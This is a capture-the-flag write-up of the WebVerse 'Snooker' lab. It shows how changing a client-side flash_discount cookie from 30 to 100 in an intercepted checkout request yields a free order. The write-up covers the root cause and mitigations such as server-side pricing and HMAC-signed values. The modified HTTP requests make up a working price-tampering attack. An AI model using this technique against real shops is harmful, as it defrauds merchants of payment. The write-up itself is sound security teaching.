---
title: "Client-Side Price Manipulation – Discount Abuse via Cookie Tampering | Snooker"
date: 2026-05-19 21:10:00 +0530
categories: [Web Security, Insecure Design]
tags: [business-logic, price-manipulation, client-side-validation, cookie-tampering, privilege-bypass, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/snooker.webp
  alt: Snooker WebVerse challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/mystery-challenges/snooker

# Overview

The **Snooker** challenge demonstrates a **business logic vulnerability** where security-sensitive pricing information was trusted from client-controlled data.

The application implemented a flash sale mechanism and stored the discount value directly inside a client-controlled cookie so the frontend could display prices without additional server requests.

Instead of validating discount values on the server, the application trusted whatever value the client supplied.

By modifying the cookie value, it became possible to force a **100% discount**, bypass payment requirements, and purchase products for free.

# Objective

Manipulate the application's pricing mechanism to complete an order without sufficient store credit and obtain the flag.

# Reconnaissance

Opening a product page:

```text
https://a5b45546-4065-snooker-effe2.events.webverselabs-pro.com/shop/runner-x1
```

Add the item to the cart:

```text
https://a5b45546-4065-snooker-effe2.events.webverselabs-pro.com/cart
```

Attempting checkout initially produced:

```text
Your store credit ($5.00) doesn't cover this order ($84.00).
```

The application correctly recognized that available credit was insufficient for purchase.

At this point, the checkout request was intercepted using Burp Suite.

# Request Analysis

Captured request:

```http
POST /checkout HTTP/2
Host: a5b45546-4065-snooker-effe2.events.webverselabs-pro.com
Cookie: session=eyJjYXJ0IjoxfQ.agw3Tg.aUu0QIuko1MTcnHWv0Em-XL5WYU; flash_discount=30

Content-Type: application/x-www-form-urlencoded

product_id=1
```

Interesting observation:

```http
flash_discount=30
```

The application stored the discount value inside a cookie.

This immediately became suspicious because:

- Cookies are fully controlled by users
- Users can modify values freely
- Sensitive calculations should not trust client input
- Discount calculations should occur server-side

# Exploitation

The original value:

```http
flash_discount=30
```

was modified to:

```http
flash_discount=100
```

Modified request:

```http
POST /checkout HTTP/2
Host: a5b45546-4065-snooker-effe2.events.webverselabs-pro.com
Cookie: session=eyJjYXJ0IjoxfQ.agw3Tg.aUu0QIuko1MTcnHWv0Em-XL5WYU; flash_discount=100

Content-Type: application/x-www-form-urlencoded

product_id=1
```

The modified request was forwarded to the server.

# Proof of Exploitation

Instead of rejecting the manipulated discount value, the application processed the purchase successfully.

Response:

```text
/order/F0D851512F34
```

The order completed despite having only:

```text
$5 store credit
```

Viewing the generated order:

```text
https://a5b45546-4065-snooker-effe2.events.webverselabs-pro.com/order/F0D851512F34
```

returned:

```text
WEBVERSE{.....}
```

The purchase was completed without paying the intended amount.

# Root Cause

The application trusted client-controlled data for a security-sensitive operation.

Application logic effectively behaved like:

```javascript
discount = request.cookies.flash_discount;

finalPrice = productPrice - (
    productPrice * discount / 100
);
```

Since cookies belong to the client, attackers could alter values before transmission.

The server performed no validation to verify:

- Whether the discount was legitimate
- Whether the value exceeded allowed limits
- Whether the user was authorized for the discount
- Whether the value originated from the application

# Vulnerability Classification

Primary vulnerability:

```text
Business Logic Vulnerability
```

Specific subtype:

```text
Client-Side Price Manipulation
```

Additional classifications:

```text
Cookie Tampering
Price Manipulation
Trusting Client-Side Data
```

OWASP mapping:

```text
A04: Insecure Design
```

# Impact

In real applications this issue could allow attackers to:

- Purchase products for free
- Abuse promotional discounts
- Bypass payment systems
- Generate financial losses
- Stack arbitrary discounts
- Manipulate pricing calculations

For e-commerce systems, this could directly affect revenue.

# Mitigation

## Never trust client-side pricing values

Sensitive calculations should always happen server-side.

Bad implementation:

```javascript
discount = cookie.flash_discount
```

Secure implementation:

```javascript
discount = getDiscountFromDatabase(user)
```

## Validate discount boundaries

Restrict acceptable values:

```text
0 ≤ discount ≤ allowed_discount
```

## Sign sensitive values

If data must be stored client-side:

```text
discount + HMAC signature
```

Any modification should invalidate the value.

## Keep business logic on the backend

Clients should only display values.

The server should remain responsible for:

- Product pricing
- Discount calculations
- Promotions
- Final payable amount

# Real-World Insight

Price manipulation issues frequently appear during penetration tests involving:

- Coupon systems
- Loyalty rewards
- Flash sales
- Shopping carts
- Promotional offers
- Gift cards

A common developer assumption is:

```text
"The user only sees this value."
```

Attackers do not interact with applications only through the UI.

They interact directly with requests.